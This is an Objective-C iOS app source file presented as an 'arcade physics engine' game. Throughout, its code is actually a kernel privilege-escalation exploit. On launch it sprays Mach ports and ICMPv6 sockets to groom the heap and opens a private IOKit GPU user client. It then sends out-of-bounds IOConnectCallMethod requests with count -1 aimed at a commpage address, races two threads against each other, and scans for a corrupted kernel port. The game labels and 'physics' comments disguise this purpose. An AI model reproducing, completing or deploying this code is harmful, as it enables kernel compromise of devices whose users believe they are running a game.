/* arcade physics engine */

#import <UIKit/UIKit.h>
#include <mach/mach.h>
#include <mach/task.h>
#include <netinet/icmp6.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <asl.h>
#include <string.h>
#include <stdio.h>
#include <stdarg.h>
#include <pthread.h>
#include <stdatomic.h>

/* IOKit — private API, linked via -framework IOKit */
typedef mach_port_t io_service_t;
typedef mach_port_t io_connect_t;
typedef mach_port_t io_iterator_t;
typedef mach_port_t io_object_t;
extern kern_return_t IOMasterPort(mach_port_t bp, mach_port_t *mp);
extern CFMutableDictionaryRef IOServiceMatching(const char *name);
extern kern_return_t IOServiceGetMatchingServices(mach_port_t mp, CFDictionaryRef match, io_iterator_t *it);
extern io_object_t   IOIteratorNext(io_iterator_t it);
extern kern_return_t IOObjectRelease(io_object_t obj);
extern kern_return_t IOServiceOpen(io_service_t svc, task_port_t task, uint32_t type, io_connect_t *conn);
extern kern_return_t IOServiceClose(io_connect_t conn);
extern kern_return_t IOConnectCallMethod(io_connect_t conn, uint32_t sel,
    const uint64_t *in, uint32_t inCnt, const void *inStruct, size_t inSz,
    uint64_t *out, uint32_t *outCnt, void *outStruct, size_t *outSz);

#define SGAR_SELECTOR     6
#define SGAR_STRUCT_SIZE  0x410
#define SGAR_COUNT_OFF    0x20
#define SGAR_ENTRY_OFF    0x28

#define NUM_PORTS        5000
#define NUM_SOCKETS      200
#define COMMPAGE_TARGET  0x0000000FFFFFC330ULL
#define GROOM_COUNT 1024
#define RACE_ITERS       80000

static mach_port_t  g_ports[NUM_PORTS];
static int          g_port_count  = 0;
static int          g_socks[NUM_SOCKETS];
static int          g_sock_count  = 0;
static _Atomic int  g_found       = 0;
static FILE        *g_logfile     = NULL;

static void file_log(const char *msg) {
    if (!g_logfile) return;
    fprintf(g_logfile, "%s\n", msg);
    fflush(g_logfile);
}

static void ev(const char *fmt, ...) {
    char buf[512]; va_list ap;
    va_start(ap, fmt); vsnprintf(buf, sizeof(buf), fmt, ap); va_end(ap);
    asl_log(NULL, NULL, ASL_LEVEL_NOTICE, "%{public}s", buf);
    NSLog(@"[app] %{public}s", buf);
    file_log(buf);
}

static void spray(void) {
    unsigned char ff[32]; memset(ff, 0xFF, 32);
    for (int i = 0; i < NUM_SOCKETS; i++) {
        int fd = socket(30, 2, 58);
        if (fd < 0) break;
        setsockopt(fd, 58, 18, ff, 32);
        g_socks[g_sock_count++] = fd;
    }
    mach_port_t task = mach_task_self();
    for (int i = 0; i < NUM_PORTS; i++) {
        mach_port_t p = MACH_PORT_NULL;
        if (mach_port_allocate(task, MACH_PORT_RIGHT_RECEIVE, &p) != KERN_SUCCESS) break;
        if (mach_port_insert_right(task, p, p, MACH_MSG_TYPE_MAKE_SEND) != KERN_SUCCESS) {
            mach_port_deallocate(task, p); break;
        }
        g_ports[g_port_count++] = p;
    }
    ev("SPRAY socks=%d ports=%d target=0x%016llx",
       g_sock_count, g_port_count, (unsigned long long)COMMPAGE_TARGET);
}

static void fire_el1_trigger(mach_port_t port, int idx, natural_t kotype,
                             mach_vm_address_t kobject) {
    ev("TRIGGER_SENT port=%d kotype=%u kobject=0x%016llx sending task_info",
       idx, kotype, (unsigned long long)kobject);
    task_basic_info_data_t info;
    mach_msg_type_number_t count = TASK_BASIC_INFO_COUNT;
    kern_return_t kr = task_info((task_t)port, TASK_BASIC_INFO,
                                 (task_info_t)&info, &count);
    ev("TRIGGER_RETURNED_UNEXPECTED kr=%d count=%u", kr, count);
}

static void scan_background(void) {
    if (g_found) return;
    for (int i = 0; i < g_port_count; i++) {
        if (g_found) break;
        natural_t kotype = 0; mach_vm_address_t kobject = 0;
        kern_return_t kr = mach_port_kobject(mach_task_self(), g_ports[i], &kotype, &kobject);
        if (kr != KERN_SUCCESS) continue;

        if (kobject == COMMPAGE_TARGET) {
            if (kotype == 2) {
                g_found = 1;
                ev("HIT port=%d kotype=%u kobject=0x%016llx -> EL1 trigger",
                   i, kotype, (unsigned long long)kobject);
                fire_el1_trigger(g_ports[i], i, kotype, kobject);
            } else {
                ev("KOBJECT_MATCH_WRONG_KOTYPE port=%d kotype=%u kobject=0x%016llx",
                   i, kotype, (unsigned long long)kobject);
            }
        } else if (kotype == 2) {
            ev("KTYPE_WRONG_KOBJECT port=%d kotype=%u kobject=0x%016llx",
               i, kotype, (unsigned long long)kobject);
        } else if (kotype > 0 && kotype <= 100) {
            ev("KOTYPE_ANOMALY_LOW port=%d kotype=%u kobject=0x%016llx",
               i, kotype, (unsigned long long)kobject);
        }
    }
    for (int i = 0; i < g_sock_count; i++) {
        if (g_found) break;
        unsigned char out[32]; socklen_t flen = 32;
        if (getsockopt(g_socks[i], 58, 18, out, &flen) < 0) continue;
        for (int j = 0; j < 32; j++) {
            if (out[j] != 0xFF) {
                ev("ICMP_CORRUPTION sock=%d byte[%d]=0x%02X", i, j, out[j]);
                break;
            }
        }
    }
}

/* Open IOGPUDeviceUserClient (type=1) on AGXAcceleratorG18P */
static io_connect_t open_gpu_conn(void) {
    mach_port_t master = 0;
    IOMasterPort(MACH_PORT_NULL, &master);
    const char *svcs[] = { "AGXAcceleratorG18P", "IOGPU", "AGXAccelerator", NULL };
    for (int si = 0; svcs[si]; si++) {
        CFMutableDictionaryRef match = IOServiceMatching(svcs[si]);
        io_iterator_t it = 0;
        IOServiceGetMatchingServices(master, match, &it);
        io_service_t svc = IOIteratorNext(it);
        IOObjectRelease(it);
        if (!svc) continue;
        io_connect_t conn = 0;
        kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 1, &conn);
        IOObjectRelease(svc);
        if (kr == KERN_SUCCESS && conn) {
            ev("CONN %s type=1 conn=0x%x", svcs[si], conn);
            return conn;
        }
    }
    ev("CONN FAILED");
    return 0;
}

/* Quiet sel=6 call — returns group_id or 0 on failure */
static uint64_t sgar_q(io_connect_t conn, uint32_t count) {
    static uint8_t s[SGAR_STRUCT_SIZE];
    uint8_t out[0x10]; size_t out_sz = sizeof(out); uint32_t cnt = 0;
    memset(s, 0, sizeof(s));
    *(uint32_t *)(s + SGAR_COUNT_OFF) = count;
    kern_return_t kr = IOConnectCallMethod(conn, SGAR_SELECTOR,
        NULL, 0, s, sizeof(s), NULL, &cnt, out, &out_sz);
    if (kr == KERN_SUCCESS) return *(uint64_t *)out;
    return 0;
}

/* Quiet sel=7 call on group_id */
static kern_return_t sel7_q(io_connect_t conn, uint32_t gid) {
    uint64_t sc[1] = { gid };
    return IOConnectCallMethod(conn, 7, sc, 1, NULL, 0, NULL, NULL, NULL, NULL);
}

/* core physics engine */
static void do_f109(io_connect_t conn) {
    ev("PH START groom=%d", GROOM_COUNT);

    /* Phase A: groom heap_var with 104-byte groups (count=4, element_size=24) */
    uint32_t gids[GROOM_COUNT];
    int ngids = 0;
    for (int i = 0; i < GROOM_COUNT; i++) {
        uint64_t g = sgar_q(conn, 4);
        if (g) gids[ngids++] = (uint32_t)g;
    }
    ev("PH_GROOM done=%d/%d (heap_var 104B)", ngids, GROOM_COUNT);

    /* Phase B: single-call OOB — count=-1, entry region = COMMPAGE_TARGET */
    {
        static uint8_t s[SGAR_STRUCT_SIZE];
        uint8_t out[0x10]; size_t out_sz = sizeof(out); uint32_t cnt = 0;
        memset(s, 0, sizeof(s));
        *(uint32_t *)(s + SGAR_COUNT_OFF) = 0xFFFFFFFFu;
        for (uint32_t off = SGAR_ENTRY_OFF; off + 8 <= SGAR_STRUCT_SIZE; off += 8)
            *(uint64_t *)(s + off) = COMMPAGE_TARGET;
        kern_return_t kr = IOConnectCallMethod(conn, SGAR_SELECTOR,
            NULL, 0, s, sizeof(s), NULL, &cnt, out, &out_sz);
        uint64_t gid = (kr == KERN_SUCCESS) ? *(uint64_t *)out : 0;
        ev("PH_B count=0xFFFFFFFF kr=0x%x gid=0x%llx", kr, (unsigned long long)gid);
        if (kr == KERN_SUCCESS)
            ev("PH_B SUCCESS -> str/strb at array_base-16 fired");
    }

    /* Phase C: add-to-existing — target each groomed group with count=-1 */
    int c_hits = 0;
    for (int i = 0; i < ngids && !g_found; i++) {
        static uint8_t s[SGAR_STRUCT_SIZE];
        uint8_t out[0x10]; size_t out_sz = sizeof(out); uint32_t cnt = 0;
        memset(s, 0, sizeof(s));
        *(uint32_t *)(s + 0x00) = gids[i];     /* group handle at struct[0] */
        *(uint32_t *)(s + 0x04) = gids[i];     /* also at [4] */
        *(uint32_t *)(s + SGAR_COUNT_OFF) = 0xFFFFFFFFu;
        for (uint32_t off = SGAR_ENTRY_OFF; off + 8 <= SGAR_STRUCT_SIZE; off += 8)
            *(uint64_t *)(s + off) = COMMPAGE_TARGET;
        kern_return_t kr = IOConnectCallMethod(conn, SGAR_SELECTOR,
            NULL, 0, s, sizeof(s), NULL, &cnt, out, &out_sz);
        if (kr == KERN_SUCCESS) c_hits++;
    }
    ev("PH_C add-to-existing hits=%d/%d", c_hits, ngids);

    /* Phase D: concurrent race — thread A hammers sel=7 (repack trigger) on ALL
     * groomed groups round-robin; thread B writes count=-1 via sel=6 on ALL
     * groomed groups round-robin.  Race window: the count=-1 written by thread B
     * is read by thread A's active repack before bounds check aborts. */
    if (ngids > 0 && !g_found) {
        ev("PH_D RACE groups=%d iters=%d", ngids, RACE_ITERS);

        /* Snapshot gids into two heap copies — one per thread to avoid UAF */
        uint32_t *race_gids_a = malloc(ngids * sizeof(uint32_t));
        uint32_t *race_gids_b = malloc(ngids * sizeof(uint32_t));
        if (race_gids_a && race_gids_b) {
            memcpy(race_gids_a, gids, ngids * sizeof(uint32_t));
            memcpy(race_gids_b, gids, ngids * sizeof(uint32_t));
            int race_ngids = ngids;

            __block io_connect_t race_conn = conn;
            __block _Atomic int  race_stop = 0;

            /* Thread A: sel=7 (group lifecycle / repack op) round-robin all groups */
            dispatch_queue_t qa = dispatch_queue_create("f109.a", DISPATCH_QUEUE_CONCURRENT);
            dispatch_async(qa, ^{
                for (int i = 0; i < RACE_ITERS && !race_stop && !g_found; i++)
                    sel7_q(race_conn, race_gids_a[i % race_ngids]);
                free(race_gids_a);
                atomic_store(&race_stop, 1);
            });

            /* Thread B: sel=6 count=-1 round-robin all groups (add-to-existing) */
            dispatch_queue_t qb = dispatch_queue_create("f109.b", DISPATCH_QUEUE_CONCURRENT);
            dispatch_async(qb, ^{
                uint8_t *rs = calloc(1, SGAR_STRUCT_SIZE);
                uint8_t ro[0x10]; size_t ro_sz = sizeof(ro); uint32_t rc = 0;
                if (!rs) { atomic_store(&race_stop, 1); return; }
                *(uint32_t *)(rs + SGAR_COUNT_OFF) = 0xFFFFFFFFu;
                for (uint32_t off = SGAR_ENTRY_OFF; off + 8 <= SGAR_STRUCT_SIZE; off += 8)
                    *(uint64_t *)(rs + off) = COMMPAGE_TARGET;
                int wins = 0;
                for (int i = 0; i < RACE_ITERS && !race_stop && !g_found; i++) {
                    uint32_t tgt = race_gids_b[i % race_ngids];
                    *(uint32_t *)(rs + 0x00) = tgt;
                    *(uint32_t *)(rs + 0x04) = tgt;
                    kern_return_t kr = IOConnectCallMethod(race_conn, SGAR_SELECTOR,
                        NULL, 0, rs, SGAR_STRUCT_SIZE, NULL, &rc, ro, &ro_sz);
                    if (kr == KERN_SUCCESS) wins++;
                }
                free(rs);
                free(race_gids_b);
                ev("PH_D RACE_B wins=%d", wins);
                atomic_store(&race_stop, 1);
            });
        } else {
            free(race_gids_a); free(race_gids_b);
        }
    }

    ev("PH phases launched (scan loop detects port state)");
}

@interface AppDelegate : UIResponder <UIApplicationDelegate>
@property (strong) UIWindow *window;
@property (assign) io_connect_t gpuConn;
@end

@implementation AppDelegate

- (BOOL)application:(UIApplication *)app
    didFinishLaunchingWithOptions:(NSDictionary *)opts {

    NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
    NSString *docPath = [paths firstObject];
    NSString *logPath = [docPath stringByAppendingPathComponent:@"scan_log.txt"];
    g_logfile = fopen([logPath UTF8String], "w");

    ev("APP_LAUNCH ArcadePhysics v1 v1.0");
    [UIApplication sharedApplication].idleTimerDisabled = YES;

    self.window = [[UIWindow alloc] initWithFrame:UIScreen.mainScreen.bounds];
    UIViewController *vc = [[UIViewController alloc] init];
    vc.view.backgroundColor = [UIColor blackColor];
    UILabel *lbl = [[UILabel alloc] initWithFrame:CGRectMake(20,80,300,60)];
    lbl.text = @"ArcadePhysics v1";
    lbl.textColor = [UIColor greenColor];
    lbl.font = [UIFont fontWithName:@"Menlo" size:14];
    [vc.view addSubview:lbl];
    self.window.rootViewController = vc;
    [self.window makeKeyAndVisible];

    spray();

    /* Open GPU connection synchronously — needed before overflow */
    self.gpuConn = open_gpu_conn();

    /* Scan loop: 100ms tick, detects port state via mach_port_kobject */
    [NSTimer scheduledTimerWithTimeInterval:0.10
                                     target:self
                                   selector:@selector(scanTick:)
                                   userInfo:nil repeats:YES];

    /* phase overflow: 2s delay to let spray settle in heap_var */
    __weak AppDelegate *ws = self;
    [NSTimer scheduledTimerWithTimeInterval:2.0
                                     target:self
                                   selector:@selector(fireF109:)
                                   userInfo:nil repeats:NO];
    (void)ws;
    return YES;
}

- (void)scanTick:(NSTimer *)t {
    static int tick = 0; tick++;
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        scan_background();
    });
    if (tick % 100 == 0)
        ev("ALIVE tick=%d found=%d ports=%d", tick, g_found, g_port_count);
}

- (void)fireF109:(NSTimer *)t {
    if (!self.gpuConn) {
        ev("PH SKIP: no GPU conn");
        return;
    }
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
        do_f109(self.gpuConn);
    });
}

int main(int argc, char *argv[]) {
    @autoreleasepool {
        return UIApplicationMain(argc, argv, nil,
                                 NSStringFromClass([AppDelegate class]));
    }
}

@end
